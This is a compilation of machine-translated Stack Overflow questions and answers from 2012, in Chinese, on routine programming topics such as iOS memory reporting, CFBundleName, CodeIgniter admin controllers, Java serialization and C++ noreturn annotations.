> ...两个条目`e1`并`e2`表示相同的映射如果
> 
> ```
>  (e1.getKey()==null ?
>        e2.getKey()==null : e1.getKey().equals(e2.getKey()))  &&
>       (e1.getValue()==null ?
>        e2.getValue()==null : e1.getValue().equals(e2.getValue())) 
> ```
> 
> 这可确保该方法在接口`equals`的不同实现中正常工作。`Map.Entry`

# objective-c - 如何从不同的类更改实例变量属性

> ID：12146727
> 
> 赞同：-2
> 
> 时间：2012-08-27T17:35:18.300
> 
> 标签：objective-c, properties, instance-variables

如果我在一个班级中有一个标签并想更改它显示的文本，我怎么能从另一个班级获得这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:52:10.573

在 Objective-C 中，您可以`properties`有效地自动创建用于访问实例变量的 getter 和 setter。

```
@interface MyClass
{
    UILabel *instanceLabel; //Not required, but I find it can make it clearer
}

@property (nonatomic, retain) UILabel *instanceLabel;

@end

@implementation MyClass

@synthesize instanceLabel; //Not required as of XCode 4.4
@end 
```

然后从您的其他类中，它是使用点运算符访问这些属性的简单案例。

```
myClassInstance.instanceLabel.text = @"newText"; 
```

您不必使用点运算符：

```
[myClassInstance instanceVariable].text = @"newText"; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-27T17:48:03.190

通常为此使用设置功能。

IE。伪代码：

```
class YourClass 
{
    private var str;

    public YourClass(var str)
    {
        this.str = str;
    }

    public setString(var str)
    {
        this.str = str;
    }

}

class SecondClass 
{
    private final YourClass myInstance;

    public SecondClass(final YourClass myInstance)
    {
        this.myInstance = myInstance;
    }

    public performChange()
    {
        myInstance.setString("hello");
    }
} 
```

然后调用 SecondClass::performChange() 会将“YourClass myInstance's”实例变量更改为“hello”。

# iphone - iPhone 应用程序使用的内存

> ID：12146736
> 
> 赞同：3
> 
> 时间：2012-08-27T17:35:54.080
> 
> 标签：iphone, ios, ios5, memory

> **可能重复：**
> [如何以编程方式判断 iOS 应用程序正在使用多少内存？](https://stackoverflow.com/questions/5046711/how-to-programmatically-tell-how-much-memory-an-ios-app-is-using)

当应用程序在前台或后台运行时，我需要知道 iPhone 使用了多少内存。如果它每 5 秒显示一次内存使用情况会更好。是否可以编写代码来显示正在使用的内存？任何建议都会被采纳

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:56:11.670

首先在 .h 文件中包含方法 report_memory 然后导入

```
#import <mach/mach.h> 
```

这个到 .m 文件

之后在要打印内存使用值的地方写下这一行

```
[NSTimer scheduledTimerWithTimeInterval:5.0 target:self selector:@selector(report_memory) userInfo:nil repeats:YES]; 
```

然后添加这个

```
-(void) report_memory {
    struct task_basic_info info;
    mach_msg_type_number_t size = sizeof(info);
    kern_return_t kerr = task_info(mach_task_self(),
                                   TASK_BASIC_INFO,
                                   (task_info_t)&info,
                                   &size);
    if( kerr == KERN_SUCCESS ) {
        NSLog(@"Memory usage: %.4lf MB", info.resident_size/1024.0/1024.0);
    } else {
        NSLog(@"Error with task_info(): %s", mach_error_string(kerr));
    }
} 
```

.m 文件的方法

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:44:46.373

用户 NSTimer 计划以 5 秒的间隔运行。要获取已用内存的值，这里有一些代码

```
#import <mach/mach.h>

void report_memory(void) {
    struct task_basic_info info;
    mach_msg_type_number_t size = sizeof(info);
    kern_return_t kerr = task_info(mach_task_self(),
                               TASK_BASIC_INFO,
                               (task_info_t)&info,
                               &size);
    if( kerr == KERN_SUCCESS ) {
        NSLog(@"Memory in use (in bytes): %u", info.resident_size);
    } else {
        NSLog(@"Error with task_info(): %s", mach_error_string(kerr));
    }
} 
```

# javascript - 确定是在浏览器历史记录中还是在最新页面上遍历

> ID：12146737
> 
> 赞同：1
> 
> 时间：2012-08-27T17:36:00.137
> 
> 标签：javascript, jquery, html, history.js

有什么方法可以确定我是否通过使用浏览器的后退按钮移回了一些较旧的页面，或者我站在最新的页面上（在历史堆栈的顶部）。

* * *

使用 History.js，JQuery 1.7

# drupal - 在 OpenAtrium/Drupal 中具有自定义工作流的 Intranet

> ID：12146742
> 
> 赞同：0
> 
> 时间：2012-08-27T17:36:11.870
> 
> 标签：drupal, workflow, open-atrium

我一直在阅读有关使用不同框架构建 Intranet 站点的信息，并且我发现 Open Atrium 是一个很好的选择，因为它*自然*地面向该用途。

我想添加一些与人事管理相关的自定义工作流程，例如，每个团队成员每周五都会收到提醒，以填写表格，其中包含每个项目每周的小时数。提交后，角色“管理员”会收到所有已收到和未收到的表格的通知，每个表格的详细信息和每个项目的小时总和。任何有关如何进行此实施的见解将不胜感激。

我已经搜索过，但没有找到具有这种工作流程的模块。这将如何使用 cck、视图或字段来实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T19:23:40.397

我将使用[规则模块](http://drupal.org/project/rules)来创建第一部分：向用户发送电子邮件以提醒他们填写表格。规则模块具有您可以使用的“向角色的所有用户发送邮件”操作。

我将使用[Views 模块](http://drupal.org/project/views)来创建填写表单的新视图（我假设它只是某种内容类型的节点），并使该视图只有管理员可以在视图的“访问”部分中访问。视图非常强大，您可能可以使用它们完成您需要的大部分操作，但是如果不知道您使用的是哪个版本的 Drupal 以及有关问题的更多详细信息（例如，用户填写的这个表单真的只是一个节点还是一个网络表单？）。作为视图功能的示例：如果您要向视图添加一个字段，您应该能够看到一个“全局：数学表达式”字段，您可以在其中执行诸如将以前的字段添加在一起等操作。

另一方面，如果您使用[Webform 模块](http://drupal.org/project/webform)构建用户必须填写的表单，则可以在每次提交时自动发送一封电子邮件，并且管理员可以将回复下载到 Excel 文件中以进一步操作。

希望其中一些想法有所帮助！

# jquery-mobile - 如何禁用jquery mobile

> ID：12146746
> 
> 赞同：1
> 
> 时间：2012-08-27T17:36:26.327
> 
> 标签：jquery-mobile

我有一个奇怪的任务，我的网站需要两种类型的弹出窗口，第一种是普通弹出窗口，用于桌面版网站，另一种用于移动版网站

问题是：是否可以在显示移动版本的弹出窗口后启用 jquery.mobile 并在关闭弹出窗口后禁用 jquery mobile ？

（供您参考：我的弹出窗口不使用 iframe）

我发现了如何在需要时启用 jquery.mobile 的奇怪方法，但在这种情况下，我无法禁用 jquery.mobile

```
$(document).bind("mobileinit", function(){
  $.mobile.autoInitializePage = false;  
});
setTimeout(function(){
  $.mobile.initializePage();// run jquery.mobile in 15 seconds for example
},15000); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:46:46.443

您可以更改 jQuery Mobile 的 CSS 以添加“标志”，使其仅适用于特定容器中的元素。

这是一个示例 jQuery Mobile CSS 规则声明（只是选择器）：

```
.ui-li-has-arrow .ui-btn-inner a.ui-link-inherit 
```

如果您将其更改为：

```
.my-custom-class .ui-li-has-arrow .ui-btn-inner a.ui-link-inherit 
```

然后 CSS 将仅应用于具有`my-custom-class`该类的元素内的元素。这意味着您可以在大多数时间拥有一个常规样式的页面，但是当您想要使用 jQuery Mobile 样式时，您只需在容器中显示您的对话框，其中包含`my-custom-class`（或任何您想要命名的类）。

# iphone - 使用 CFBundleName 的位置

> ID：12146750
> 
> 赞同：16
> 
> 时间：2012-08-27T17:36:48.987
> 
> 标签：iphone, objective-c, ios, xcode, cocoa

从这个老问题：[可可应用程序的信息列表中的“捆绑显示名称”和“捆绑名称”有什么区别](https://stackoverflow.com/questions/3465792/whats-the-difference-between-bundle-display-name-and-bundle-name-in-cocoa-a)

它指向官方文档，其中说：

> **CFBundleName**
> 
> **CFBundleName** (String - iOS, OS X) 标识包的短名称。此名称的长度应少于 16 个字符，并且适合显示在菜单栏和应用程序的信息窗口中。您可以将此键包含在适当的 .lproj 子目录的 InfoPlist.strings 文件中，以便为其提供本地化值。如果你本地化这个键，你还应该包含键“CFBundleDisplayName”。</p>

谁能告诉如何在 iOS 中显示这个名字？

我从来没有能够在我的 iPhone 中显示这个值。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-02T00:45:25.867

在我看来，它不像在 iOS 上向用户`CFBundleName`展示的**任何地方。**我相信我已经看过 Mac OS X 的文档（显然 iOS 继承了很多遗留的基础设施），上面说 Bundle Name**用于**其他用途......我认为它可能是上部菜单中的名称栏，或较低的 Dock 栏。当然，iOS 中都不存在任何东西。

我还发现[了这个 Stack Overflow 答案](https://stackoverflow.com/a/3557740/119114)，它现在已经很老了（但有不少赞成票）。这个答案声称 CFBundleName 将是存储应用程序的文件夹的名称。因此，例如，`CFBundleName = HelloWorld`应该产生

```
+- HelloWorld.app
    - HelloWorldApplication 
```

如果**Executable Name**设置为`HelloWorldApplication`. 但是，我只是构建了一个简单的程序并在 iOS 5.0 上运行它，而 .app 文件夹的名称**不**等于`CFBundleName`. 所以，如果它**曾经**那样工作，它似乎不再是。

我已经看到很多参考资料说`CFBundleName`应该`${PRODUCT_NAME}`在 Xcode 中设置为，这是我一直做的。不是作为*技术*限制，而是作为 Apple 审查标准，我还看到有人声称`CFBundleDisplayName`必须*与*. `CFBundleName`例如，如果它是 的缩短版本是可以的`CFBundleName`，但如果它完全不相关，他们可能会拒绝该应用程序。

我还检查了**Settings.app**和 iTunes 中的列表，但我在这些地方都没有看到**Bundle Name**。

所以，为了回答你的问题，我不相信这个变量对用户是可见的（在 iOS 上）。

* * *

**更新：**但是，我**没有**检查任何辅助功能是否可以在任何地方*说出*这个名字。

此外，[这个 SO answer](https://stackoverflow.com/a/9510132/119114)声称这`CFBundleName`将是您的应用程序的 iTunes App Store URL 中使用的名称。但是，请参阅下面的@tc. 的评论/示例 URL ...

* * *

**更新 2**：根据下面@honus 的评论，*可以*向用户显示的一种*不寻常*的情况是，如果您的应用在其 Info.plist 文件中**没有**条目。在这种情况下，将显示在 SpringBoard 中的应用程序图标下。`CFBundleName` ***`CFBundleDisplayName``CFBundleName`***

 **** * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-06-24T15:47:26.847

它没有详细记录，但在[ASWebAuthenticationSession](https://developer.apple.com/documentation/authenticationservices/aswebauthenticationsession)`CFBundleName`显示的权限对话框中显示给用户。

[![ASWebAuthenticationSession 对话框示例](../Images/6e4f4ac44305c6844b4894097b1819a4.png)](https://i.stack.imgur.com/TzSyl.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:43:38.750

您可以像这样访问这些密钥。

```
[[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"] 
```

`infoDicitonary`在哪里`A dictionary, constructed from the bundle's Info.plist file`。在那里您可以找到有关您的应用程序的此类信息。[NSBundle](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSBundle_Class/Reference/Reference.html)

`App-info.plist`注意：您可以通过打开文件并右键单击任意位置然后选择选项来检查实际密钥`Show Raw Keys/Values`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-09T14:08:25.190

在本地化 MacOS Cocoa 应用程序时，在 Mac OS 菜单栏中使用 CFBundleName 作为应用程序名称（位于文件菜单的右侧）。所以它肯定是有意义的。不知道，如果它被使用并显示在其他地方。但是，在本地化您的应用程序时，最好不要忽略它！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-12-10T22:57:47.193

在 macOS 上，它被用作决定应用程序名称是否应在 Finder 中本地化的一种方式。如果包的实际名称（当然由“.app”扩展）匹配`CFBundleName`，Finder 将显示其本地化显示名称。但是，用户可能会将应用程序重命名为他认为更合适的名称，在这种情况下，macOS 需要一种方法来判断名称是否是自定义的。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-08-27T18:06:51.530

如果您通过上下文单击项目树中的 info.plist 文件并选择“打开为 > 源代码”来打开 info.plist 文件，您将看到 plist 的 XML 表示。默认情况下，这两个键具有相同的值，因此您可以访问其中一个。

```
<key>CFBundleDisplayName</key>
<string>${PRODUCT_NAME}</string>
<key>CFBundleName</key>
<string>${PRODUCT_NAME}</string> 
```

要实际获取值，您可以使用此 SO 帖子作为指导：[如何向用户显示我的应用程序的当前项目版本？](https://stackoverflow.com/questions/1492351/how-to-display-the-current-project-version-of-my-app-to-the-user)只需将`CFBundleVersion`密钥替换为`CFBundleDisplayName`.

在本质上：

```
NSString *displayName = [[[NSBundle mainBundle] infoDictionary] 
                                          valueForKey:@"CFBundleDisplayName"]; 
```

* * *

## 回答 #7

> 赞同：-4
> 
> 时间：2012-09-05T06:45:03.373

Bundle name 是文件系统上实际应用程序包的名称。

捆绑显示名称是用户将在其 iOS 设备上看到的应用程序图标的标题或在 OSX 上的图标标题。***

# java - 序列化和数据库存储的区别

> ID：12146752
> 
> 赞同：4
> 
> 时间：2012-08-27T17:36:52.790
> 
> 标签：java, serialization

java中的序列化和数据库存储有什么区别？序列化实际上不意味着将数据存储在服务器上的数据库中吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-27T17:55:19.360

让我们把数据库想象成一个碗。

![在此处输入图像描述](../Images/3999abb1b35d02e98d200f11176e5076.png)

如果你想防止东西到处乱跑，你把它放在碗里。

你的东西就是你想要存储的数据。现在它就在那里，在桌子上，在一个盒子里。 ![在此处输入图像描述](../Images/91cd892f59372a9c34514314de2d97e7.png)

所以我们要把这些东西从那个盒子里拿出来。问题是，我们盒子里的东西可能装不进碗里。我们如何解决这个问题？

我们需要将其更改为适合我们碗的对象类型。我们需要**序列化**它。

![在此处输入图像描述](../Images/47fe62bcb94608ba198960e6d14f8a2f.png)

我们的序列化数据现在可以放入碗中。所以我们把我们的序列化数据倒进碗里，我们吃了一天中最重要的一餐。

![在此处输入图像描述](../Images/eab42d303337876fc6b3a15fc17e2c1c.png)

万一这一切真的很复杂。简化：**序列化**就是**改变**，**数据库**是**存储**东西的地方。通常，您会在**存储**之前**更改**内容。

 *** * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:42:42.263

序列化可用于为数据库存储准备对象 - 它是将对象转换为可存储或可传输格式的过程，例如字符串或字节流。

我们无法将 java 对象按原样存储到大多数普通存储类型中 - 但如果我们将其序列化为 JSON，我们可以将其存储。然后，我们可以稍后从存储中检索 JSON 并对其进行反序列化，以获取与原始对象相同的对象，前提是序列化和反序列化已正确实现。

当然，这不一定需要数据库存储——例如，将对象序列化为 JSON 流还允许我们通过 Internet 传输它以在另一台计算机上反序列化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:45:42.153

序列化是将数据结构转换为可以以任何方式持久化（保存在硬盘上）的形式的过程。它可以是二进制、xml、纯文本、html……通常的目标是能够反序列化，即恢复数据结构在持久化时的状态。

数据库只是您存储数据的**地方**（而不是**方式）。**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:39:53.273

一点都不。Java 中的序列化是一种 API，它生成对象的可存储版本，您可以稍后从磁盘（或存储它的任何地方）加载回该对象，并使其恢复为具有（**希望！**）与以前相同的状态的对象。它还有其他替代品，例如[Google Protobufs](http://code.google.com/p/protobuf/)，它们更适合网络应用程序，但对于大多数简单用途来说已经足够了。**

# c# - 我可以限制进程的 RAM 使用量吗？

> ID：12146755
> 
> 赞同：2
> 
> 时间：2012-08-27T17:37:06.083
> 
> 标签：c#, .net, windows

是否可以人为限制 .NET 进程可以使用的内存量？我正在寻找模拟低内存情况以进行测试。

现在我们使用虚拟机来处理这类事情。它有效，但我很想知道我们是否能找到更方便的方法。一个可以轻松自动化的将是理想的。

**编辑：**正如 Hans Passant 指出的那样，仅仅限制进程可用的虚拟内存量不会取代基于 VM 的测试。测试是为了性能，所以我需要交换而不是`OutOfMemoryException`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:39:57.000

> 一个可以轻松自动化的将是理想的。

您可以使用[Windows 作业对象](http://msdn.microsoft.com/en-us/library/ms684161%28VS.85%29.aspx)从代码中进行管理。进程可以与作业相关联，并且[JOBOBJECT_BASIC_LIMIT_INFORMATION](http://msdn.microsoft.com/en-us/library/ms684147%28v=vs.85%29.aspx)允许您限制工作集的大小。

或者，您可以直接在进程上调用[SetProcessWorkingSetSize](http://msdn.microsoft.com/en-us/library/ms686234%28v=vs.85%29.aspx)，这将限制该进程的最大允许内存使用量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:39:54.350

windows Application Verifier 工具可以模拟低资源级别，例如低内存：http: [//msdn.microsoft.com/en-us/library/aa480483.aspx](http://msdn.microsoft.com/en-us/library/aa480483.aspx)

使用作业对象（正如@ReedCopsey 也建议）的更程序化的解决方案在这里： http: [//www.codeproject.com/Articles/17831/How-to-Set-the-Maximum-Memory-a-Process-can-Use -在](http://www.codeproject.com/Articles/17831/How-to-Set-the-Maximum-Memory-a-Process-can-Use-at)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T18:08:29.237

> 现在我们使用虚拟机来处理这类事情

这可能意味着您限制了*RAM*的数量。这不是什么测试，Windows 进程永远不会耗尽 RAM。你只会减慢这个过程，操作系统会更频繁地交换页面。

真正的限制是可用的*虚拟内存地址空间*。这是 32 位进程的固定数字，2 GB。给予或采取一些非标准的选择来增加这个数字。OutOfMemoryException 告诉您该进程在 VM 中没有留下足够大的孔来适应分配。

您可以通过简单地分配一堆 50 兆字节的 byte[] 数组并将它们存储在`List<byte[]>`Main() 开头的静态类型变量中来限制 VM 空间的数量。

# codeigniter - 在 Code Igniter 2.0 中创建管理部分控制器和视图

> ID：12146757
> 
> 赞同：3
> 
> 时间：2012-08-27T17:37:15.163
> 
> 标签：codeigniter, codeigniter-2

我已经使用about、products 等控制器创建了我的网站……这给了我example.com/about/ 等。

如何创建具有相同控制器名称的管理部分，例如 example.com/admin/about 或 example.com/admin/products ？

如何组织我的控制器？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:56:08.570

**补充WebweaverD**答案的另外2 个选项。

1.  使用[模块化分离](http://codeigniter.com/forums/viewthread/121820/)
2.  创建第二个应用程序文件夹和索引文件，负责管理，将它们连接到同一个系统文件夹。

设置后，第二个选项非常容易管理。有一些变化，但我发现下面的结构是最方便的。

```
mykewlwebsite.com
  apps/
    frontend/
      app/            frontend codeigniter application folder
      public/
        index.php
        assets/       frontend js, css, images
    backend
      app/            backend codeigniter application folder
      public/
        index.php
        assets/       backend js, css, images
  config/
    database.php
    constants.php
  system/             codeigniter system folder 
```

**database.php**文件包含来自 CodeIgniter 的代码，并`config/database.php`为项目的所有应用程序共享 - 只需删除所有代码并添加`require_once('../../../../config/database.php');`到`config/database.php`

**公共文件夹中的index.php**文件有两个重要的变量`$system_path`，`$application_folder`将它们更改为

```
$system_path = '../../../system/codeigniter';
$application_folder = '../app'; 
```

**constants.php**文件可以包含一些常量`ENVIRONMENT`，例如文件中的常量`index.php`和其他常量。只是`require_once()`从`index.php`文件中。

虽然有利有弊。

**优点**

对于那些在 localhost 上开发并通过 FTP 或其他系统部署到服务器的人来说，他们可以简单地上传一个文件夹 -`apps`并覆盖目标文件夹而不必担心覆盖`database.php`设置（我相信你们中的大多数人的设置与本地不同） ）。

添加一个应用程序很容易 - 只需复制现有的一个。您可以根据需要添加任意数量的应用程序 - api、ajax、用户文件柜等。

**缺点**

如果您有一个域`mykewlwebsite.com`并且能够向其中添加子域，则可以使用此结构，因此您只需为每个域配置主文件夹：

**mykewlwebsite.com**：路径/到/mykewlwebsite.com/apps/frontend/public/

**admin.mykewlwebsite.com**：路径/to/mykewlwebsite.com/apps/backend/public/

**api.mykewlwebsite.com**：路径/到/mykewlwebsite.com/apps/api/public/

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-27T17:50:52.067

你有几个选择：

1)**创建一个子**文件夹 - 将它们放在控制器目录中名为 admin 的文件夹中（在 application/contollers/admin/products.php 中）

这里有一个警告，你只能深入一个文件夹，否则 codeigniter 会感到不安。此外，它将首先使用第一级控制器/方法，因此请注意命名冲突 - 例如，如果您有一个带有产品方法的管理控制器，它将在它在管理目录中查找产品控制器之前被调用。（访问 example.com/admin/products 时）

2）**使用路由文件**- 如果只是您担心的 url，您可以随意调用控制器，并使用 application/config/routes 将这些路径重定向到您想要的控制器，如下所示：

控制器名称：admin_products.php

路线文件：

```
$route['admin/products'] = "admin_products"; 
```

3）**对所有人使用主控制器**- 最后的选择是拥有一个管理控制器并在其中使用命名方法，例如，您有 admin.php 控制器，其中包含产品方法，然后由 admin/products 调用uri（虽然在大型应用程序/站点中这可能会变得混乱 - 不推荐）

希望我已经为您解释了这一点，如果您需要任何澄清，请询问，我会尽力详细说明。

# vaadin - VAADIN 页面导航和验证

> ID：12146758
> 
> 赞同：0
> 
> 时间：2012-08-27T17:37:16.757
> 
> 标签：vaadin

在 VAADIN 中，我尝试了许多页面导航选项。只有链接组件选项有效。一直创建新窗口对于构建大型企业应用程序没有用处。链接组件的问题是当用户直接在浏览器中提供该链接时，页面即将到来。是否有任何选项可以使用过滤器和任何 xml 过滤页面以检查和转发到正确的页面，如 struts-config 或 faces-config.xml？是否有任何选项可用于 cookie 处理、篡改和维护不同选项卡和窗口之间的会话？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T14:59:51.970

您是否尝试过 Navigator7 插件进行导航？[链接到 navigator7 插件](https://vaadin.com/directory#addon/navigator7)

您可以使用 @Page 注释创建页面并在其上放置组件并使用页面名称和 ID 进行导航。

# tomcat - 在 Tomcat 中重新加载 Clojure 代码

> ID：12146761
> 
> 赞同：5
> 
> 时间：2012-08-27T17:37:25.897
> 
> 标签：tomcat, clojure

我有一个在 Tomcat 中运行的现有 Java webapp，我正在向其中添加一些原始的 Clojure 支持。目前，我只是将 Clojure 源文件作为资源包含在类路径中，并通过`clojure.lang.RT`. 它很原始，但工作正常。

但是，我注意到 Tomcat 的`WebappClassLoader`缓存资源是通过`getResourceAsInputStream()`Clojure 用来检索和编译源代码的。也就是说，`(require 'my-ns :reload)`即使磁盘上有更新的文件，也只会重新加载文件的缓存版本。有没有办法规避或避免 Clojure 文件的这种缓存？

经过多次无果的谷歌搜索后，我想到的最好的方法是使用反射手动删除`WebappClassLoader.resourceEntries`糟糕*的*条目。

我肯定错过了什么。

“使用 Jetty/Glassfish/JBoss”、“重启 Tomcat”等答案不是我想要的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T19:07:10.563

您将无法规避`WebappClassLoader`' 那里的行为。您*可以*做的是将正在加载的代码移到其管辖范围之外；例如高达，如此[处](http://tomcat.apache.org/tomcat-6.0-doc/class-loader-howto.html)`$CATALINA_HOME/lib`所述。

您还需要将所有依赖项移到那里，将您实际部署为 web 应用程序的 .war 文件保留为一个小 shell，它期望所有代码已经在其他地方可用。

这将使您摆脱`WebappClassLoader`的管辖范围，并希望它的语义也是如此。（如果它缓存从父类加载器加载的东西，那似乎完全破坏了 IMO。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T19:23:39.363

你能把 Clojure 源文件放在下面`WEB-INF`吗？然后您可以使用[http://tomcat.apache.org/tomcat-5.5-doc/servletapi/javax/servlet/ServletContext.html#getResourceAsStream(java.lang.String](http://tomcat.apache.org/tomcat-5.5-doc/servletapi/javax/servlet/ServletContext.html#getResourceAsStream(java.lang.String) )阅读它们

`servletContext.getResourceAsStream("/WEB-INF/foo/core.clj");`

过去，这对我有用，可以从 Tomcat 中的源代码加载未缓存的 Groovy 类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-28T05:55:52.510

这与[此处](http://tomcat.apache.org/tomcat-6.0-doc/config/context.html)`cachingAllowed`描述的标志有关吗？只是射向蓝色。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-28T06:05:41.113

或者使用 clojure 的补丁版本，它可以执行以下操作：

```
(io/input-stream (io/resource "bla.clj")) 
```

我在网上找到了一个评论，这个没有缓存。

# powershell - Exchange 2010 自动发现 URL

> ID：12146766
> 
> 赞同：1
> 
> 时间：2012-08-27T17:38:07.317
> 
> 标签：powershell, exchange-server, outlook-2010, exchange-server-2010, autodiscovery

希望有人能帮助我，因为我正用这个把头撞在墙上！我已尽我所能阅读和研究，但找不到解决方案。

我有一台 Exchange 2010 服务器。活动目录域是 example.com，我所有的用户都是这样的：first.last@example.com。

但是，我已在 IIS 中将 Outlook Web Access 的 URL 设置为[https://exchange.example.net](https://exchange.example.net)。（注意它是一个 .NET tld），因为我有 *.example.net 的站点范围的 SSL 证书。

这是我想要的设置。它工作得很好。

但是，自动发现导致 Outlook 2010 客户端出现问题。打开 Outlook 大约 30 秒后，在建立与 Exchange 的连接（成功）后，我收到一个证书警告，告诉我证书名称不匹配。

它会弹出两次，首先是 autodiscover.example.com，然后是 exchange.example.com。

我需要将 URL 更改为 autodiscover.example.NET 和 exchange.example.NET。

请有人帮助我——这让我绝望！

谢谢，

西蒙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T12:48:56.733

打开 ExchangeManagmentShell（带有 Exchange 扩展的 Powershell）并发出以下命令：

*Get-ExchangeCertificate |select -ExpandProperty CertificateDomains*

你能在输出中看到你的域名吗？

# html - 复制 HTML 代码但不更改 javascript

> ID：12146770
> 
> 赞同：0
> 
> 时间：2012-08-27T17:38:35.177
> 
> 标签：html, firebug

在 Firebug 中，HTML 选项卡中有非常有用的“复制 HTML”选项。但复制的 HTML 代码还包括 javascript 更改，例如在 document.ready (jQuery) 事件上添加新类。我想复制原始 HTML 代码，如“查看源代码”选项（它是每个浏览器）中没有和 javascript 更改。是的，我可以使用“查看源代码”选项，但是那里的代码非常分散，很难复制一个不丢失结束标记的大 HTML 节点，并且在带有折叠祝福的萤火虫中，我可以匹配折叠的 HTML 节点，右键单击并选择“复制 HTML”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:46:07.037

使用 AJAX 调用从服务器获取 SAME 页面，将其分配给变量。完毕。

# java - Android - 动态加载内容

> ID：12146771
> 
> 赞同：0
> 
> 时间：2012-08-27T17:38:39.127
> 
> 标签：java, android, dynamic, scrollable

我的应用程序中有一个页面，用户可以在其中看到新闻提要（主要是图像）。如何显示这些图像（也许使用 LinearLayout？）？如果是这样，我如何在向下滚动时动态增加这个可滚动布局的大小？（加载更多图像）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:42:03.730

您必须使用[ListView](http://developer.android.com/reference/android/widget/ListView.html)。从文档：

```
A view that shows items in a vertically scrolling list. 
```

您必须向`ListAdapter`您的 ListView 提供一个。基本上 apdater 是填充`ListView`. 它是高度可定制的。您可以简单地将您的数据集或适配器传递给`extend`适配器并自定义`getView`方法以获得所需的数据表示。

教程可以在[这里找到](http://www.vogella.com/articles/AndroidListView/article.html)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-27T18:15:36.903

是的，您必须使用 listview，只需添加内容并通知适配器。

# c++ - 我可以告诉编译器考虑关闭关于返回值的控制路径吗？

> ID：12146772
> 
> 赞同：8
> 
> 时间：2012-08-27T17:38:40.990
> 
> 标签：c++, visual-studio-2010, g++, warnings

假设我有以下功能：

```
Thingy& getThingy(int id)
{
    for ( int i = 0; i < something(); ++i )
    {
        // normal execution guarantees that the Thingy we're looking for exists
        if ( thingyArray[i].id == id )
            return thingyArray[i];
    }

    // If we got this far, then something went horribly wrong and we can't recover.
    // This function terminates the program.
    fatalError("The sky is falling!");

    // Execution will never reach this point.
} 
```

编译器通常会对此抱怨，说“并非所有控制路径都返回值”。这在技术上是正确的，但是不返回值的控制路径会在函数结束之前中止程序，因此在语义上是正确的。有没有办法告诉编译器（在我的情况下是 VS2010，但我也对其他人感到好奇）为了进行此检查而忽略某个控制路径，而不会完全抑制警告或返回无意义的假人函数末尾的值？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-27T17:42:37.093

您可以注释函数`fatalError`（它的声明），让编译器知道它永远不会返回。

在 C++11 中，这将类似于：

```
[[noreturn]] void fatalError(std::string const&); 
```

在 C++11 之前，您具有编译器特定的属性，例如 GCC：

```
void fatalError(std::string const&) __attribute__((noreturn)); 
```

或 Visual Studio 的：

```
__declspec(noreturn) void fatalError(std::string const&); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:44:55.833

为什么不抛出异常？这将解决问题，并强制调用方法处理异常。

如果你确实设法以某种方式讨价还价，你仍然不得不对调用 getThingy() 的函数做一些事情。当 getThingy() 失败时会发生什么？来电者怎么知道？您在这里拥有的是一个例外（从概念上），您的设计应该反映这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:47:45.637

您可以使用运行时断言代替您的`fatalError`例程。这看起来像：

```
Thingy& getThingy(int id)
{
    for ( int i = 0; i < something(); ++i )
    {
        if ( thingyArray[i].id == id )
            return thingyArray[i];
    }
    // Clean up and error condition reporting go here.
    **assert(false);**
} 
```

# ruby - Ruby - 在 Ruby 中扩展内置变量

> ID：12146777
> 
> 赞同：1
> 
> 时间：2012-08-27T17:39:04.920
> 
> 标签：ruby, oop, types, metaprogramming

我想在 Ruby 中扩展变量的功能。原因是我正在研究类似于类型系统或值检查器的东西（这听起来有点疯狂，但整个想法很长，只是我想扩展默认变量的原因）。

我读过在 Ruby 中，一切都是对象。所以变量是对象。并且 Ruby 对于可以通过元编程更改的内容应该是相当自由的。

是否有某种与我可以扩展的局部变量相关的“类”？

我想为每个包含一个类型的字符串表示的变量关联一个字符串变量。此外，我想拦截变量分配并在每次将新值分配给变量时执行一个方法。这样我就可以根据类型检查新值是否正确（作为字符串存储在变量中）。

如果 Ruby 中的局部变量被定义为类的对象，我可以扩展该类或通过 ruby​​ mixin 修改它。

解决方法是为我的变量创建一个新类（而不是使用 Ruby 的本地变量的构建）。此类可以具有值属性、类型的属性（存储为字符串）以及获取和设置方法。这样我可以解决我的问题，但如果可能的话，我想扩展 ruby​​ 中的内置变量。

**目前正在进行的工作**

```
class Fixnum
        attr_accessor :tp
        @tp

        def mytype ( type )
